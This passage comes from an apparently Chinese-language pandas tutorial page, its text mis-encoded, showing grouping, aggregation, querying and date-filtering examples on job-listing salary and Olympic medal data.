align="right">False</td><td>â€˜å®šæœŸä½“æ£€â€™</td></tr><tr><td align="right">0</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">50-150äºº</td><td align="right">ç§»åŠ¨äº’è”ç½‘,ç”µå•†</td><td align="right">Aè½®</td><td align="right">[â€˜ç»©æ•ˆå¥–é‡‘â€™, â€˜å¸¦è–ªå¹´å‡â€™, â€˜å®šæœŸä½“æ£€â€™, â€˜å¼¹æ€§å·¥ä½œâ€™]</td><td align="right">äº§å“|éœ€æ±‚|é¡¹ç›®ç±»</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">2020&#x2F;3&#x2F;16 11:00</td><td align="right">ä½™æ­åŒº</td><td align="right">37500</td><td align="right">1-3å¹´</td><td align="right">å…¨èŒ</td><td align="right">æœ¬ç§‘</td><td align="right">äº”é™©ä¸€é‡‘ã€å¼¹æ€§å·¥ä½œã€å¸¦è–ªå¹´å‡ã€å¹´åº¦ä½“æ£€</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>â€˜å¼¹æ€§å·¥ä½œâ€™</td></tr><tr><td align="right">1</td><td align="right">æ•°æ®å»ºæ¨¡</td><td align="right">150-500äºº</td><td align="right">ç”µå•†</td><td align="right">Bè½®</td><td align="right">[â€˜å¹´ç»ˆå¥–é‡‘â€™, â€˜åšäº”ä¼‘äºŒâ€™, â€˜å…­é™©ä¸€é‡‘â€™, â€˜å­å¥³ç¦åˆ©â€™]</td><td align="right">å¼€å‘|æµ‹è¯•|è¿ç»´ç±»</td><td align="right">æ•°æ®å¼€å‘</td><td align="right">å»ºæ¨¡</td><td align="right">2020&#x2F;3&#x2F;16 11:08</td><td align="right">æ»¨æ±ŸåŒº</td><td align="right">15000</td><td align="right">3-5å¹´</td><td align="right">å…¨èŒ</td><td align="right">æœ¬ç§‘</td><td align="right">å…­é™©ä¸€é‡‘,å®šæœŸä½“æ£€,ä¸°åšå¹´ç»ˆ</td><td align="right">disabled</td><td align="right">176</td><td align="right">32.559414</td><td align="right">False</td><td>â€˜å¹´ç»ˆå¥–é‡‘â€™</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">åˆ†ç»„</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># åˆ†ç»„ï¼Œä½†ä¸ä½œä¸ºç´¢å¼•</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>, as_index=<span class="literal">False</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line"><span class="comment"># åˆ†ç»„ pandas.core.series.Series æ ¼å¼</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line">df[<span class="string">&#x27;salary&#x27;</span>].groupby(df[<span class="string">&#x27;district&#x27;</span>]).mean() </span><br><span class="line"><span class="comment"># åˆ†ç»„ pandas.core.frame.DataFrame æ ¼å¼</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;salary&#x27;</span>].mean().to_frame()</span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[[<span class="string">&#x27;salary&#x27;</span>]].mean()</span><br><span class="line">df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(<span class="string">&#x27;district&#x27;</span>).mean()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›¸åŒçš„ç»“æœ</span></span><br><span class="line">df[<span class="string">&#x27;salary&#x27;</span>].groupby([df[<span class="string">&#x27;workYear&#x27;</span>],</span><br><span class="line">                      df[<span class="string">&#x27;education&#x27;</span>]]).mean()</span><br><span class="line">df.groupby([<span class="string">&#x27;workYear&#x27;</span>, <span class="string">&#x27;education&#x27;</span>]).mean()[<span class="string">&#x27;salary&#x27;</span>]</span><br><span class="line">df.groupby([<span class="string">&#x27;workYear&#x27;</span>, <span class="string">&#x27;education&#x27;</span>])[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line">df.groupby([<span class="string">&#x27;workYear&#x27;</span>, <span class="string">&#x27;education&#x27;</span>])[<span class="string">&#x27;salary&#x27;</span>].agg(<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># groupby ç”¨å­—å…¸</span></span><br><span class="line"><span class="comment">#å°† score å’Œ matchScore çš„å’Œè®°ä¸ºæ€»åˆ†ï¼Œä¸ salary åˆ—åŒæ—¶è¿›è¡Œåˆ†ç»„ï¼Œå¹¶æŸ¥çœ‹ç»“æœ</span></span><br><span class="line">df.groupby(&#123;<span class="string">&#x27;salary&#x27;</span>:<span class="string">&#x27;è–ªèµ„&#x27;</span>,<span class="string">&#x27;score&#x27;</span>:<span class="string">&#x27;æ€»åˆ†&#x27;</span>,<span class="string">&#x27;matchScore&#x27;</span>:<span class="string">&#x27;æ€»åˆ†&#x27;</span>&#125;, axis=<span class="number">1</span>).<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ†ç»„è®¡ç®—ä¸åŒè¡Œæ”¿åŒºï¼Œè–ªæ°´çš„æœ€å°å€¼ã€æœ€å¤§å€¼å’Œå¹³å‡å€¼</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&#x27;salary&#x27;</span>].agg([<span class="built_in">min</span>, <span class="built_in">max</span>, np.mean])</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹ä¸åŒè¡Œæ”¿åŒºè¿›è¡Œåˆ†ç»„ï¼Œå¹¶ç»Ÿè®¡è–ªæ°´çš„å‡å€¼ã€ä¸­ä½æ•°ã€æ–¹å·®ï¼Œä»¥åŠå¾—åˆ†çš„å‡å€¼</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).agg(</span><br><span class="line">    &#123;<span class="string">&#x27;salary&#x27;</span>: [np.mean, np.median, np.std], <span class="string">&#x27;score&#x27;</span>: np.mean&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯¹ä¸åŒå²—ä½(positionName)è¿›è¡Œåˆ†ç»„ï¼Œå¹¶ç»Ÿè®¡å…¶è–ªæ°´(salary)ä¸­ä½æ•°å’Œå¾—åˆ†(score)å‡å€¼</span></span><br><span class="line">df.groupby(<span class="string">&#x27;positionName&#x27;</span>).agg(&#123;<span class="string">&#x27;salary&#x27;</span>: np.median, <span class="string">&#x27;score&#x27;</span>: np.mean&#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ç»Ÿè®¡æ¯ä¸ªåŒºä¸åŒå¤§å°å…¬å¸ä¸ªæ•°</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># æ–¹å¼1ï¼šgroupby</span></span><br><span class="line">df.groupby([<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;companySize&#x27;</span>])[<span class="string">&#x27;companySize&#x27;</span>].count()</span><br><span class="line"><span class="comment"># æ–¹å¼2ï¼švalue_counts() æ’åºæŒ‰ç…§ä¸ªæ•°é™åº</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;companySize&#x27;</span>].value_counts()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹groupçš„ç»“æœ</span></span><br><span class="line">df.groupby([<span class="string">&quot;district&quot;</span>,<span class="string">&#x27;salary&#x27;</span>]).groups</span><br><span class="line"><span class="comment"># å°†æ•°æ®æŒ‰ç…§ districtã€salary è¿›è¡Œåˆ†ç»„ï¼Œå¹¶æŸ¥çœ‹è¥¿æ¹–åŒºè–ªèµ„ä¸º 30000 çš„å·¥ä½œ</span></span><br><span class="line">df.groupby([<span class="string">&quot;district&quot;</span>,<span class="string">&#x27;salary&#x27;</span>]).get_group((<span class="string">&quot;è¥¿æ¹–åŒº&quot;</span>,<span class="number">30000</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æˆ‘ä»¬å°†ä¼šç”¨åˆ° transform è€Œä¸æ˜¯ applyæˆ–è€…meanã€‚ åŸå› æ˜¯ï¼Œ transform å°†ä¼šä¿æŒ dataframe çŸ©é˜µçš„å½¢çŠ¶(shape)(å°±æ˜¯è¡Œåˆ—æ•°ä¸å˜)è€Œ apply ä¼šæ”¹å˜çŸ©é˜µçš„å½¢çŠ¶ã€‚</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># åœ¨åŸæ•°æ®æ¡† df æ–°å¢ä¸€åˆ—ï¼Œæ•°å€¼ä¸ºè¯¥åŒºçš„å¹³å‡è–ªèµ„æ°´å¹³</span></span><br><span class="line">df[<span class="string">&#x27;è¯¥åŒºå¹³å‡å·¥èµ„&#x27;</span>] = df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(by=<span class="string">&#x27;district&#x27;</span>).transform(<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—å„è¡Œæ”¿åŒºçš„ä¼ä¸šé¢†åŸŸï¼ˆindustryFieldï¼‰åŒ…å«ç”µå•†çš„æ€»æ•°</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&quot;industryField&quot;</span>].apply(<span class="keyword">lambda</span> x: x.<span class="built_in">str</span>.contains(<span class="string">&#x27;ç”µå•†&#x27;</span>).<span class="built_in">sum</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment">#é€šè¿‡ positionName çš„é•¿åº¦è¿›è¡Œåˆ†ç»„ï¼Œå¹¶è®¡ç®—ä¸åŒé•¿åº¦å²—ä½åç§°çš„è–ªèµ„å‡å€¼</span></span><br><span class="line">df.set_index(<span class="string">&quot;positionName&quot;</span>).groupby(<span class="built_in">len</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">where ç­‰åŒäºå†™åœ¨df[]ä¸­çš„æ¡ä»¶</span></span><br><span class="line"><span class="string">query å‡½æ•°æˆ‘ç±»ä¼¼sqlè¯­è¨€ä¸­çš„where ç›¸å½“äºåœ¨dfä¸­å†™sql</span></span><br><span class="line"><span class="string">filter ç±»ä¼¼sqlä¸­groupbyåçš„having</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># where</span></span><br><span class="line">work_index.where(work_index[<span class="string">&#x27;åœ°å¸‚&#x27;</span>]==<span class="string">&#x27;å¦é—¨å¸‚&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">work_index.query(<span class="string">&#x27;åœ°å¸‚==&quot;å¦é—¨å¸‚&quot;&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">work_index[work_index[<span class="string">&#x27;åœ°å¸‚&#x27;</span>]==<span class="string">&#x27;å¦é—¨å¸‚&#x27;</span>]</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">work_index.loc[work_index[<span class="string">&#x27;åœ°å¸‚&#x27;</span>]==<span class="string">&#x27;å¦é—¨å¸‚&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># æå–å¹³å‡å·¥èµ„å°äº 30000 çš„è¡Œæ”¿åŒºçš„å…¨éƒ¨æ•°æ®</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;salary&#x27;</span>].mean() &lt; <span class="number">30000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡åŒ¿åå‡½æ•°åˆ†ç»„ æ ¹æ® createTime åˆ—ï¼Œè®¡ç®—æ¯å¤©ä¸åŒ è¡Œæ”¿åŒº æ–°å¢çš„å²—ä½æ•°é‡</span></span><br><span class="line">pd.DataFrame(df.groupby([df.createTime.apply(<span class="keyword">lambda</span> x:x.day)])[</span><br><span class="line">             <span class="string">&#x27;district&#x27;</span>].value_counts()).rename_axis([<span class="string">&quot;å‘å¸ƒæ—¥&quot;</span>, <span class="string">&quot;è¡Œæ”¿åŒº&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡ df2 è®¡ç®—è·å¾—å¥–ç‰Œæœ€å¤šçš„è¿åŠ¨å‘˜</span></span><br><span class="line">df2[<span class="string">&#x27;è¿åŠ¨å‘˜&#x27;</span>].value_counts().sort_values(ascending=<span class="literal">False</span>).head(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#ç­‰ä»·äº</span></span><br><span class="line">df.groupby(<span class="string">&#x27;è¿åŠ¨å‘˜&#x27;</span>).count()[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>].sort_values(ascending=<span class="literal">False</span>).head(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å„å›½åœ¨ä¸åŒé¡¹ç›®ä¸Šçš„è·å¥–ç‰Œæƒ…å†µ</span></span><br><span class="line"><span class="comment"># è¿™é‡Œæ‹¬å·å†…è¦å†™df[]</span></span><br><span class="line">df2[<span class="string">&#x27;æ€»å¥–ç‰Œæ•°&#x27;</span>].groupby([df2[<span class="string">&#x27;å›½å®¶&#x27;</span>],df2[<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]]).count().to_frame()</span><br><span class="line"></span><br><span class="line">df2.groupby([<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]).count()[<span class="string">&#x27;æ€»å¥–ç‰Œæ•°&#x27;</span>].to_frame()</span><br><span class="line">pd.pivot_table(df2,values = [<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>],index = [<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>],aggfunc = <span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‰ç…§åˆ—è®¡ç®—å¹³å‡å€¼</span></span><br><span class="line">df.mean(axis=<span class="string">&#x27;columns&#x27;</span>)</span><br><span class="line">df.mean(axis=<span class="number">1</span>) <span class="comment">#ä¸æ˜¯0ï¼Œ1æ˜¯ç®—æ¯åˆ—çš„å‡å€¼ç„¶åç„¶ååˆå¹¶ä¸ºä¸€è¡Œ</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è‡ªå®šä¹‰å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myfunc</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x.<span class="built_in">max</span>()-x.mean()</span><br><span class="line"></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).agg(æœ€ä½å·¥èµ„=(<span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;min&#x27;</span>), æœ€é«˜å·¥èµ„=(</span><br><span class="line">    <span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;max&#x27;</span>), å¹³å‡å·¥èµ„=(<span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;mean&#x27;</span>), æœ€å¤§å€¼ä¸å‡å€¼å·®å€¼=(<span class="string">&#x27;salary&#x27;</span>, myfunc)).rename_axis([<span class="string">&quot;è¡Œæ”¿åŒº&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®— æ€»åˆ†ã€é«˜ç«¯äººæ‰å¾—åˆ†ã€åŠå­¦å±‚æ¬¡å¾—åˆ†çš„æœ€å¤§æœ€å°å€¼ã€ä¸­ä½æ•°ã€å‡å€¼</span></span><br><span class="line">df.agg(&#123;</span><br><span class="line">        <span class="string">&quot;æ€»åˆ†&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;é«˜ç«¯äººæ‰å¾—åˆ†&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;åŠå­¦å±‚æ¬¡å¾—åˆ†&quot;</span>:[<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>]&#125;)</span><br></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹æ•°æ®ä¿¡æ¯</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹æ•°æ®è¡Œåˆ—æ•°</span></span><br><span class="line">df.shape</span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ•°æ®é‡</span></span><br><span class="line">df.size</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ æ•°å€¼å‹ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œè®¡æ•°ã€å‡å€¼ä»€ä¹ˆçš„</span></span><br><span class="line">df.describe()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ ç¦»æ•£å‹ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œè®¡æ•°ã€é¢‘ç‡ä»€ä¹ˆ</span></span><br><span class="line">df.describe(include=[<span class="string">&#x27;O&#x27;</span>])</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ å…¨éƒ¨ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯</span></span><br><span class="line">df.describe(include=<span class="string">&#x27;all&#x27;</span>)</span><br><span class="line"><span class="comment"># å»é™¤é‡å¤çš„</span></span><br><span class="line">df[<span class="string">&#x27;a&#x27;</span>].unique()</span><br></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹ç»Ÿè®¡æ•°æ®</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹æ•°æ®è¡Œåˆ—æ•°</span></span><br><span class="line">df.shape</span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ•°æ®é‡</span></span><br><span class="line">df.size</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ æ•°å€¼å‹ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œè®¡æ•°ã€å‡å€¼ä»€ä¹ˆçš„</span></span><br><span class="line">df.describe()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ ç¦»æ•£å‹ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œè®¡æ•°ã€é¢‘ç‡ä»€ä¹ˆ</span></span><br><span class="line">df.describe(include=[<span class="string">&#x27;O&#x27;</span>])</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ å…¨éƒ¨ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯</span></span><br><span class="line">df.describe(include=<span class="string">&#x27;all&#x27;</span>)</span><br><span class="line"><span class="comment"># è®¡ç®— æ€»åˆ†ã€é«˜ç«¯äººæ‰å¾—åˆ†ã€åŠå­¦å±‚æ¬¡å¾—åˆ†çš„æœ€å¤§æœ€å°å€¼ã€ä¸­ä½æ•°ã€å‡å€¼</span></span><br><span class="line">df.agg(&#123;</span><br><span class="line">        <span class="string">&quot;æ€»åˆ†&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;é«˜ç«¯äººæ‰å¾—åˆ†&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;åŠå­¦å±‚æ¬¡å¾—åˆ†&quot;</span>:[<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>]&#125;)</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¯¢</span></span><br><span class="line">df.query(<span class="string">&#x27;é‡‘ç‰Œæ•°+é“¶ç‰Œæ•° &gt; 15&#x27;</span>)</span><br><span class="line">df_01.loc[df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>].isin([<span class="string">&#x27;å·¥ä¸š&#x27;</span>,<span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span>])]</span><br><span class="line">df_01.loc[(df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>]==<span class="string">&#x27;å·¥ä¸š&#x27;</span>)|(df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>]==<span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span>)]</span><br><span class="line">df_01[df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>].<span class="built_in">str</span>.contains(<span class="string">&#x27;å·¥ä¸š|å»ºç­‘ä¸š&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æå–å…¨éƒ¨åˆ—åä¸­ä»¥ â€œæ•°â€ ç»“å°¾çš„åˆ—</span></span><br><span class="line">df.loc[:, df.columns.<span class="built_in">str</span>.endswith(<span class="string">&#x27;æ•°&#x27;</span>)]</span><br><span class="line"><span class="comment"># æå–ç¬¬1ï¼Œ2ï¼Œ3ï¼Œ4åˆ—</span></span><br><span class="line">df.iloc[:,<span class="number">0</span>:<span class="number">4</span>] </span><br><span class="line">df.iloc[:,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢ç±»å‹</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df4.select_dtypes(include=[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br><span class="line">df4.select_dtypes(exclude=[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br></pre></td></tr></table></figure><ul><li>æ•°æ®å±•å¼€</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¦‚æœè¡ŒAå’Œè¡ŒCå­˜åœ¨[a,b,c]è¿™æ ·çš„åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨</span></span><br><span class="line">df5.explode([<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;C&#x27;</span>])</span><br></pre></td></tr></table></figure><ul><li>æ•°æ®ç´¯åŠ </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>)].cumsum()</span><br><span class="line">df[<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>)].cumsum(axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>æŒ‰æ—¶é—´è¿›è¡Œç­›é€‰</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ä¸€èˆ¬æ¥è¯´å¯ä»¥æŠŠdatetimeä½œä¸ºç´¢å¼•ï¼Œæ¯”è¾ƒæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œç­›é€‰æ“ä½œ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># å°†DateTimeè½¬æˆæ—¥æœŸæ ¼å¼</span></span><br><span class="line">df[<span class="string">&#x27;DateTime&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;DateTime&#x27;</span>])</span><br><span class="line"><span class="comment"># å°†æ—¥æœŸè®¾ä¸ºindex</span></span><br><span class="line">df = df.set_index(<span class="string">&#x27;DateTime&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­›é€‰ä»2019å¹´3æœˆ1å·åˆ°2019å¹´3æœˆ10å·æ•´åå¤©çš„æ•°æ®</span></span><br><span class="line">df1 = df[<span class="string">&#x27;2019-03-01&#x27;</span>:<span class="string">&#x27;2019-03-10&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">å¦‚æœæˆ‘ä»¬ä¸æƒ³æˆ–è€…ä¸å¥½å°†datetimeè®¾ç½®ä¸ºç´¢å¼•ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># è®¾ç½®å¼€å§‹æ—¶é—´</span></span><br><span class="line">from_date = df[<span 